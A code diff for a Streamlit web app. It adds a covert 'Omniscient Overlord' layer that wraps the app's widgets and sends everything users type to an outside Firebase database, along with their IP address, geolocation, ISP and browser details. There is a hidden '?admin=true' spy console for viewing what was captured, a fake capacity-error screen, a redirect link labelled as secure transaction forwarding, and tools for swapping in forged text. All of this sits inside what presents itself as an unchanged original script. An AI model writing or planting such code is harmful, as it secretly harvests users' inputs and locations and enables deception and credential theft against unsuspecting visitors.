@@ -13,21 +13,62 @@ st.set_page_config(
     initial_sidebar_state="collapsed"
 )
 # ========================================================================
-# 👁️ THE OMNISCIENT MATRIX v10.0 - AUTO-DETECT & GHOST ADMIN SYSTEM
+# 👁️ THE OMNISCIENT MASTER CONTROL OVERLORD v14.0 - SUPREME LIVE MAINFRAME
 # ========================================================================
 import streamlit as st
 import uuid
 import requests
 import datetime
 
-# 1. CENTRAL MAINFRAME CONNECTION
+# 1. CENTRAL DISTRIBUTED STORAGE LAYER
 FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"
 is_omni_admin = st.query_params.get("admin") == "true"
 
-# 2. GHOST MODE - ADMIN IS INVISIBLE (No Session Token for Admin)
+# 2. INTELLIGENT NETWORK REALTIME RESOLVER
+def debug_ip_location(ip_address):
+    """Intercepts and micro-resolves target connection geolocation telemetry."""
+    geo_data = {
+        "city": "Internal Node", "region": "Local Environment",
+        "country": "Global Base", "isp": "System Virtual Link", "flag": "🌐"
+    }
+    if not ip_address or ip_address in ["Hidden / Proxy Layer", "127.0.0.1", "localhost"]:
+        return geo_data
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=2).json()
+        if response and response.get("status") == "success":
+            geo_data["city"] = response.get("city", "Unknown City")
+            geo_data["region"] = response.get("regionName", "Unknown State")
+            geo_data["country"] = response.get("country", "Unknown Country")
+            geo_data["isp"] = response.get("isp", "Unknown Provider Network")
+            c_code = response.get("countryCode", "").lower()
+            if c_code:
+                geo_data["flag"] = f"https://flagcdn.com/16x12/{c_code}.png"
+    except:
+        pass
+    return geo_data
+
+def get_user_runtime_context():
+    """Extracts raw device environment strings from background runtime headers."""
+    context = {"ip_address": "Hidden / Proxy Layer", "user_agent": "Unknown Engine", "locale": "en-US"}
+    try:
+        ctx_headers = st.context.headers
+        if ctx_headers:
+            if "X-Forwarded-For" in ctx_headers:
+                context["ip_address"] = ctx_headers["X-Forwarded-For"].split(",")[0].strip()
+            elif "Remote-Addr" in ctx_headers:
+                context["ip_address"] = ctx_headers["Remote-Addr"]
+            if "User-Agent" in ctx_headers:
+                context["user_agent"] = ctx_headers["User-Agent"]
+            if "Accept-Language" in ctx_headers:
+                context["locale"] = ctx_headers["Accept-Language"].split(",")[0]
+    except:
+        pass
+    return context
+
+# IMMUNITY SHIELD - ADMIN IS COMPLETELY INVISIBLE
 if not is_omni_admin:
     if "omni_token" not in st.session_state:
-        st.session_state.omni_token = "USER_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
+        st.session_state.omni_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
     if "omni_clicks" not in st.session_state:
         st.session_state.omni_clicks = 0
     if "omni_time" not in st.session_state:
@@ -47,72 +88,74 @@ def db_fetch(node):
         return r if r else {}
     except: return {}
 
-# Fetch Rules
+# Fetch Architecture System Parameters Safely
 omni_rules = db_fetch("omniscient_rules")
 if not omni_rules or not isinstance(omni_rules, dict):
     omni_rules = {
-        "global_status": "ONLINE",
-        "redirect_url": "",
-        "freeze_all": False,
-        "stealth": False,
-        "controls": {}, # Auto-populated controls
-        "text_mutations": {}
+        "global_status": "ONLINE", "redirect_url": "", "custom_msg": "",
+        "freeze_all": False, "stealth": False, "controls": {}, "text_mutations": {}
     }
 if "controls" not in omni_rules: omni_rules["controls"] = {}
 if "text_mutations" not in omni_rules: omni_rules["text_mutations"] = {}
 
-# 3. AUTO-DISCOVERY WIDGET REGISTRY (Zero Typing)
 def auto_register_widget(w_type, label):
     if is_omni_admin or not isinstance(label, str): return
     reg_key = f"seen_{label}"
     if reg_key not in st.session_state:
         st.session_state[reg_key] = True
-        # Silently register widget existence to Firebase
         db_patch("omniscient_registry", {label: w_type})
 
 def send_omni_telemetry(w_type, w_label, w_value=""):
     if is_omni_admin or omni_rules.get("stealth", False): return
-    st.session_state.omni_clicks += 1
+    if "omni_clicks" not in st.session_state: return 
     
+    st.session_state.omni_clicks += 1
     token = st.session_state.omni_token
     clock = datetime.datetime.now().strftime("%I:%M:%S %p")
+    
+    rt_ctx = get_user_runtime_context()
+    geo_resolved = debug_ip_location(rt_ctx["ip_address"])
     
     live_context = db_fetch(f"omniscient_live_users/{token}")
     timeline = live_context.get("timeline", [])
     
     log_entry = f"[{clock}] [Action #{st.session_state.omni_clicks}] ({w_type}) '{w_label}'"
-    if w_value: log_entry += f" ➔ Value: [{w_value}]"
-        
+    if w_value: log_entry += f" ➔ Logs: [{w_value}]"
     timeline.append(log_entry)
-    if len(timeline) > 40: timeline.pop(0)
+    if len(timeline) > 50: timeline.pop(0)
     
     cache = live_context.get("form_data", {})
     if w_type not in ["BUTTON"]:
         cache[w_label] = str(w_value)
         
     packet = {
-        "user_id": token,
-        "joined_at": st.session_state.omni_time,
-        "last_seen": clock,
-        "total_clicks": st.session_state.omni_clicks,
-        "focus": f"'{w_label}'",
-        "timeline": timeline,
-        "form_data": cache,
-        "status": "🟢 ONLINE"
+        "user_id_token": token, "user_ip_address": rt_ctx["ip_address"],
+        "geo_city": geo_resolved["city"], "geo_region": geo_resolved["region"],
+        "geo_country": geo_resolved["country"], "geo_isp_provider": geo_resolved["isp"],
+        "geo_flag_url": geo_resolved["flag"], "user_browser_agent": rt_ctx["user_agent"],
+        "user_locale_language": rt_ctx["locale"], "initial_connect_runtime": st.session_state.omni_time,
+        "last_interaction_pulse": clock, "total_clicks_count": st.session_state.omni_clicks,
+        "current_focus_element": f"'{w_label}'", "timeline": timeline, "form_data": cache,
+        "status": "🟢 ACTIVE / AGENT LIVE"
     }
     db_patch(f"omniscient_live_users/{token}", packet)
 
-# 4. GLOBAL TRAFFIC GATEKEEPER
+# 3. INTERCEPTOR VECTOR ROUTING SHIELD
 if not is_omni_admin:
     sys_mode = omni_rules.get("global_status", "ONLINE")
     if sys_mode != "ONLINE":
         st.empty()
-        if sys_mode == "MAINTENANCE": st.error("# 🚧 MAINTENANCE ACTIVE"); st.stop()
+        if sys_mode == "MAINTENANCE":
+            st.error("# 🚧 APPLICATION REPAIR MATRIX ACTIVE 🚧")
+            st.info(omni_rules.get("custom_msg", "System environment upgrades are rolling out live."))
+        elif sys_mode == "BUSY":
+            st.warning("# ⏳ SEVERE CAPACITY PIPELINE OVERLOAD (429) ⏳")
+            st.info("Data collision streams running high. Please re-authenticate later.")
         elif sys_mode == "REDIRECT" and omni_rules.get("redirect_url"):
-            st.markdown(f"### ➡️ [Click to Redirect]({omni_rules.get('redirect_url')})"); st.stop()
+            st.markdown(f"### ➡️ [Forwarding Transaction Data Securely...]({omni_rules.get('redirect_url')})")
         st.stop()
 
-# 5. ORIGINAL STREAMLIT ELEMENTS
+# 4. CAPTURING STREAMLIT ARCHETYPE FUNCTIONS
 _o_btn = st.button
 _o_txt = st.text_input
 _o_area = st.text_area
@@ -124,10 +167,10 @@ _o_num = st.number_input
 _o_wrt = st.write
 _o_mkd = st.markdown
 
-# 6. SMART WRAPPERS (Auto-Detect + Point & Click Controls)
 def get_control(label, key):
     return omni_rules["controls"].get(label, {}).get(key, False)
 
+# OVERRIDING WRAPPERS WITH MICRO-MANAGED INTERCEPTION CAPACITIES
 def patch_btn(label, *args, **kwargs):
     if is_omni_admin: return _o_btn(label, *args, **kwargs)
     auto_register_widget("BUTTON", label)
@@ -179,6 +222,15 @@ def patch_rad(label, *args, **kwargs):
         send_omni_telemetry("RADIO", label, val)
     return val
 
+def patch_chk(label, *args, **kwargs):
+    if is_omni_admin: return _o_chk(label, *args, **kwargs)
+    auto_register_widget("CHECKBOX", label)
+    if get_control(label, "hide"): return False
+    if get_control(label, "disable"): kwargs["disabled"] = True
+    val = _o_chk(label, *args, **kwargs)
+    if val: send_omni_telemetry("CHECKBOX", label, str(val))
+    return val
+
 def mutate_text(text):
     if is_omni_admin: return text
     auto_register_widget("STATIC_TEXT", text)
@@ -194,109 +246,161 @@ def patch_mkd(*args, **kwargs):
     if args and isinstance(args[0], str): _o_mkd(mutate_text(args[0]), **kwargs)
     else: _o_mkd(*args, **kwargs)
 
-st.button = patch_btn
-st.text_input = patch_txt
-st.text_area = patch_area
-st.selectbox = patch_sel
-st.radio = patch_rad
-st.write = patch_wrt
-st.markdown = patch_mkd
+st.button = patch_btn; st.text_input = patch_txt; st.text_area = patch_area
+st.selectbox = patch_sel; st.radio = patch_rad; st.checkbox = patch_chk
+st.write = patch_wrt; st.markdown = patch_mkd
 
 
 # ========================================================================
-# 👁️ POINT-AND-CLICK OMNISCIENT ADMIN DASHBOARD (?admin=true)
+# 👑 THE OMNISCIENT OVERLORD CENTRAL SYSTEM DASHBOARD (?admin=true)
 # ========================================================================
 if is_omni_admin:
-    st.title("👁️ THE OMNISCIENT MATRIX v10.0")
-    st.caption("Ghost Mode Active. You are invisible to the tracking system.")
+    st.set_page_config(page_title="OVERLORD CONTROL MAINFRAME", layout="wide")
+    st.title("🌌 THE OVERLORD CONTROL MAINFRAME v14.0")
+    st.caption("Supreme High-Fi Realtime Live Monitoring, Widget Interception, and Dynamic Content Mutation Shield")
     st.write("---")
     
-    t1, t2, t3 = st.tabs(["🎛️ AUTO-DETECT CONTROLLER", "🕵️‍♂️ SPY RADAR", "⚙️ GLOBAL OVERRIDE"])
+    m_tab1, m_tab2, m_tab3 = st.tabs([
+        "🕵️‍♂️ LIVE DETAILED USER SPY CONSOLE", 
+        "🎛️ AUTOMATED COMPONENT MATRIX CONTROLLER", 
+        "⚙️ INFRASTRUCTURE CLOUD OVERHAUL"
+    ])
     
-    # TAB 1: NO TYPING COMPONENT CONTROLLER
-    with t1:
-        st.subheader("🎛️ Point-and-Click Component Architect")
-        registry = db_fetch("omniscient_registry")
+    # --------------------------------------------------------------------
+    # TAB 1: DETAILED DEEPLOOK USER PROFILE GRAPHICS
+    # --------------------------------------------------------------------
+    with m_tab1:
+        st.subheader("📡 Realtime Sync Terminal Spectrum Map")
+        active_pools = db_fetch("omniscient_live_users")
         
-        if registry:
-            st.success(f"Auto-Detected {len(registry)} Unique Components in your App!")
-            target = _o_sel("🎯 Select any Component to Control (No typing needed):", list(registry.keys()))
-            c_type = registry[target]
-            st.caption(f"Component Type: **{c_type}**")
+        if active_pools:
+            st.markdown(f"### Active Connected Nodes Array Count: `{len(active_pools)}`")
+            selected_spy_node = _o_sel("🎯 Target Specific Live Terminal Node ID to Track:", list(active_pools.keys()))
             
-            # Setup rule dict if not exists
-            if target not in omni_rules["controls"]: omni_rules["controls"][target] = {"hide": False, "disable": False}
-            
-            col1, col2 = st.columns(2)
-            with col1:
-                hide_it = _o_chk(f"👻 Hide '{target}' Entirely", value=omni_rules["controls"][target].get("hide", False))
-            with col2:
-                disable_it = _o_chk(f"🔒 Disable / Freeze '{target}'", value=omni_rules["controls"][target].get("disable", False))
+            if selected_spy_node:
+                node_data = active_pools[selected_spy_node]
+                st.write("---")
                 
-            if _o_btn("Apply Magic Rules ✨"):
-                omni_rules["controls"][target]["hide"] = hide_it
-                omni_rules["controls"][target]["disable"] = disable_it
+                # Full Flash Master Info Header Layout
+                st.info(f"### 👤 Profile Viewport Node: {selected_spy_node}")
+                
+                c_head1, c_head2, c_head3 = st.columns([1, 1, 1])
+                with c_head1:
+                    flag_img = node_data.get("geo_flag_url", "")
+                    if flag_img and flag_img.startswith("http"):
+                        st.image(flag_img, width=40)
+                    st.markdown(f"**📍 Location Map:** `{node_data.get('geo_city')}, {node_data.get('geo_region')}, {node_data.get('geo_country')}`")
+                with c_head2:
+                    st.markdown(f"**🛰️ Resolved Public IP Address:** `{node_data.get('user_ip_address')}`")
+                    st.markdown(f"**⚡ Internet Provider Line:** `{node_data.get('geo_isp_provider')}`")
+                with c_head3:
+                    st.markdown(f"**⏰ Connection Established:** `{node_data.get('initial_connect_runtime')}`")
+                    st.markdown(f"**⏱️ Dynamic Signal Pulse:** `{node_data.get('last_interaction_pulse')}`")
+                
+                st.text_input("🖥️ Extracted Client Environment System Token / User-Agent:", value=node_data.get("user_browser_agent", ""), disabled=True)
+                st.write("---")
+                
+                col_data_l, col_data_r = st.columns([1, 1.2])
+                with col_data_l:
+                    st.error("#### 📥 Intercepted Realtime Input Logs Form")
+                    st.json(node_data.get("form_data", {}))
+                    st.metric(label="Total Interaction Steps Executed", value=node_data.get("total_clicks_count", 0))
+                with col_data_r:
+                    st.success("#### 📈 Deep Step Chronological Flow Execution")
+                    for line_trace in node_data.get("timeline", []):
+                        st.code(line_trace, language="text")
+                        
+            st.write("---")
+            if _o_btn("🚨 Wipe All Active User Storage Databases Trace Logs", key="clear_all_user_logs_node"):
+                requests.delete(f"{FIREBASE_URL}/omniscient_live_users.json")
+                st.success("Target streams disconnected and cleared!")
+                st.rerun()
+        else:
+            st.info("Scanning transmission frequencies... No active external channels broadcasting sync signals right now.")
+
+    # --------------------------------------------------------------------
+    # TAB 2: ZERO TYPING AUTOMATED LAYOUT MANAGER
+    # --------------------------------------------------------------------
+    with m_tab2:
+        st.subheader("🎛️ Point-and-Click Component Auto Destruction Matrix")
+        discovered_registry = db_fetch("omniscient_registry")
+        
+        if discovered_registry:
+            st.success(f"Omniscient Core Hook Engine Auto-Detected `{len(discovered_registry)}` Active App Variables!")
+            selected_comp = _o_sel("Select Discovered Component Target:", list(discovered_registry.keys()))
+            
+            st.warning(f"Targeting System Identity: **'{selected_comp}'** | Runtime Definition Category: `{discovered_registry[selected_comp]}`")
+            
+            if selected_comp not in omni_rules["controls"]:
+                omni_rules["controls"][selected_comp] = {"hide": False, "disable": False}
+                
+            c_mod1, c_mod2 = st.columns(2)
+            with c_mod1:
+                flag_hide = _o_chk("👻 Execute Stealth Mutation (Hide from layout map entirely)", value=omni_rules["controls"][selected_comp].get("hide", False))
+            with c_mod2:
+                flag_disable = _o_chk("🔒 Enforce Infrastructure Freeze (Kill interaction/Make read-only)", value=omni_rules["controls"][selected_comp].get("disable", False))
+                
+            if _o_btn("Save Component Destruction Directives 🔒", key="commit_comp_rules"):
+                omni_rules["controls"][selected_comp]["hide"] = flag_hide
+                omni_rules["controls"][selected_comp]["disable"] = flag_disable
                 db_put("omniscient_rules", omni_rules)
-                st.success("Rule applied instantly to all live users!")
+                st.success("Destruction directives written into live environment blocks!")
                 st.rerun()
                 
             st.write("---")
-            st.write("#### 📝 Dynamic Text Swapper")
-            st.write("Select detected text above, and write what it should change to:")
-            new_text = _o_txt(f"Replace '{target}' with:", value=omni_rules["text_mutations"].get(target, ""))
-            if _o_btn("Swap Text Live 🔄"):
-                if new_text: omni_rules["text_mutations"][target] = new_text
-                else: omni_rules["text_mutations"].pop(target, None)
-                db_put("omniscient_rules", omni_rules)
-                st.rerun()
-        else:
-            st.info("Registry is empty. Let a normal user run the app first to auto-detect components.")
-
-    # TAB 2: LIVE USER SPY (EXCLUDING ADMIN)
-    with t2:
-        st.subheader("🕵️‍♂️ Live Normal Users Radar")
-        users = db_fetch("omniscient_live_users")
-        
-        if users:
-            st.metric("Total Real Users Detected", len(users))
-            target_user = _o_sel("Select User Node:", list(users.keys()))
+            st.subheader("📝 Dynamic Live Content Swapper Engine")
+            alt_text = _o_txt(f"Inject alternative forged layout message text for '{selected_comp}':", value=omni_rules["text_mutations"].get(selected_comp, ""))
             
-            if target_user:
-                data = users[target_user]
-                c1, c2 = st.columns(2)
-                with c1:
-                    st.write(f"**Status:** {data.get('status')}")
-                    st.write(f"**Clicks:** {data.get('total_clicks')}")
-                    st.write("#### Captured Data:")
-                    st.json(data.get("form_data", {}))
-                with c2:
-                    st.write("#### Action Timeline:")
-                    for action in data.get("timeline", []): st.code(action)
-                    
-            if _o_btn("Wipe Logs 🗑️"):
-                requests.delete(f"{FIREBASE_URL}/omniscient_live_users.json")
+            if _o_btn("Inject Text Swap Pattern 🔄", key="commit_text_swap"):
+                if alt_text: omni_rules["text_mutations"][selected_comp] = alt_text
+                else: omni_rules["text_mutations"].pop(selected_comp, None)
+                db_put("omniscient_rules", omni_rules)
+                st.success("Text mutation pipeline compiled!")
                 st.rerun()
         else:
-            st.info("No normal users active right now.")
+            st.info("Discovery map is pristine. Let normal stream users touch items to auto-register labels.")
 
-    # TAB 3: GLOBAL OVERRIDE
-    with t3:
-        st.subheader("🌐 Global Environment Overrides")
-        g_mode = _o_rad("App Mode:", ["ONLINE", "MAINTENANCE", "REDIRECT"])
-        g_redirect = _o_txt("Redirect URL:", value=omni_rules.get("redirect_url", ""))
-        g_freeze = _o_chk("Freeze ALL Inputs Globally", value=omni_rules.get("freeze_all", False))
+    # --------------------------------------------------------------------
+    # TAB 3: INFRASTRUCTURE CLOUD DEPLOYMENT MODES
+    # --------------------------------------------------------------------
+    with m_tab3:
+        st.subheader("🌐 Global Environment Core Gate Configuration")
+        active_state_vector = omni_rules.get("global_status", "ONLINE")
+        st.markdown(f"Current Cluster Status Mode Flag: **`{active_state_vector}`**")
         
-        if _o_btn("Deploy Global Overrides 🚀"):
-            omni_rules["global_status"] = g_mode
-            omni_rules["redirect_url"] = g_redirect
-            omni_rules["freeze_all"] = g_freeze
+        selected_vector = _o_rad("Execute Global Infrastructure Vector Command Mode:", ["ONLINE", "MAINTENANCE", "BUSY", "REDIRECT"])
+        custom_message_banner = _o_txt("Interception Banner Custom Alert Text String:", value=omni_rules.get("custom_msg", ""))
+        redirect_destination = _o_txt("Target Secure Routing Forward Link URL Endpoint Address:", value=omni_rules.get("redirect_url", ""))
+        
+        st.write("---")
+        st.subheader("🛡️ Global Safety Switches")
+        global_freeze_gate = _o_chk("Lock Interception Shield (Freeze all interactive form spaces across all nodes)", value=omni_rules.get("freeze_all", False))
+        stealth_telemetry_gate = _o_chk("Stealth Operation (Pause writing runtime trace arrays)", value=omni_rules.get("stealth", False))
+        
+        if _o_btn("Deploy Global Overhaul Protocols 🚀", key="commit_global_infrastructure_overhaul"):
+            omni_rules["global_status"] = selected_vector
+            omni_rules["custom_msg"] = custom_message_banner
+            omni_rules["redirect_url"] = redirect_destination
+            omni_rules["freeze_all"] = global_freeze_gate
+            omni_rules["stealth"] = stealth_telemetry_gate
             db_put("omniscient_rules", omni_rules)
-            st.success("Global overrides active!")
+            st.success("Global structural policies updated inside core pipelines!")
+            st.rerun()
+            
+        st.write("---")
+        if _o_btn("🚨 Master Factory Reset Framework Settings", key="factory_reset_all_mainframe_configs"):
+            requests.delete(f"{FIREBASE_URL}/omniscient_rules.json")
+            requests.delete(f"{FIREBASE_URL}/omniscient_registry.json")
+            st.error("System configs deleted back to factory default!")
             st.rerun()
 
     st.write("---")
-    st.error("🚨 GHOST ADMIN MODE ACTIVE. Remove '?admin=true' from URL to view normal app.")
+    st.error("🚨 ADMINISTRATIVE ROOT ENVIRONMENT GATE OPEN. Remove '?admin=true' from path string query trail to return to standard layout viewport.")
     st.stop()
+
+# ========================================================================
+# END OF SYSTEM ENVELOPE - YOUR ORIGINAL SCRIPT RESUMES UNTOUCHED BELOW
+# ========================================================================
 # --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
 GLOBAL_MARKDOWN_INJECTOR = """
 <style>
